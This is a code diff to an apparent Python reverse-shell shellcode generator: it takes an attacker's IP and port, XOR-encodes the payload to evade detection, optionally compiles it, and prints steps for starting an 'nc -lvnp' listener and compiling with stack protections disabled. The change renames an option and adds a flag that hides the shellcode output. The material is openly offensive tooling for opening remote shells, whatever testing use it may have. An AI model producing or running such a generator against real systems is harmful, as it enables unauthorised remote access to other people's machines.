@@ -34,8 +34,9 @@ def main():
     parser.add_argument('-i', '--ip', dest='ip', help='IPv4 Address', required=True)
     parser.add_argument('-p', '--port', dest='port', help='Port to bind', required=True)
     parser.add_argument('-e', '--endian', dest='endianness', choices=['big', 'little'], help='Endianness of the target, default=little', default='little', required=False)
-    parser.add_argument('-n', '--nbxor', dest='nbxor', help='Number of xor to put, default=10', type=int, default=10, required=False)
+    parser.add_argument('-x', '--xornb', dest='xornb', help='Number of xor to put, default=10', type=int, default=10, required=False)
     parser.add_argument('-b', '--build', dest='compile', help="Compile the C file", action='store_true', required=False)
+    parser.add_argument('-n', '--hide-shellcode', dest='hide_shellcode', help="Hide the shellcode printing", default=False, action='store_true', required=False)
     
     args = parser.parse_args()
 
@@ -45,25 +46,27 @@ def main():
 
     iphex = dechex.iphex(args.ip, args.endianness)
     porthex = dechex.porthex(args.port, args.endianness)
-    nbxor = args.nbxor
+    xornb = args.xornb
 
     if iphex and porthex:
         ipbloc = bloc.ip(iphex)
         portbloc = bloc.port(porthex)
-        build.shellcode(baseshell, ipbloc, portbloc, nbxor)
+        shellcode = build.shellcode(baseshell, ipbloc, portbloc, xornb)
         if args.compile:
             build.compile()
 
-        print(f' [!] Shellcode generated!\n')
-        print(f' [+] Number of xor put : {args.nbxor}')
+        if not args.hide_shellcode:
+            print(f' [!] Shellcode generated :\n\n{shellcode}\n\n')
+        print(f' [!] Shellcode saved at shellcode.txt\n')
+        print(f' [+] Number of xor put : {args.xornb}')
         print(f' [+] IPv4 address to connect to : {args.ip}')
         print(f' [+] Port to bind : {args.port}')
         if args.compile:
-            print(f' [+] Compiled shellcode : reverse_shell')
+            print(' [+] Compiled shellcode : reverse_shell')
             print(f' [+] Start a listener : nc -lvnp {args.port}\n')
         else:
-            print(f' [+] Shellcode at : reverse_shell.c')
-            print(f' [+] Build : gcc reverse_shell.c -o shell -fno-stack-protector -z execstack -no-pie\n')
+            print(' [+] C file to test the shellcode : reverse_shell.c')
+            print(' [+] Build : gcc reverse_shell.c -o shell -fno-stack-protector -z execstack -no-pie\n')
     else:
         parser.print_help()
         print('\n [-] Invalid ip address or port value.\n')
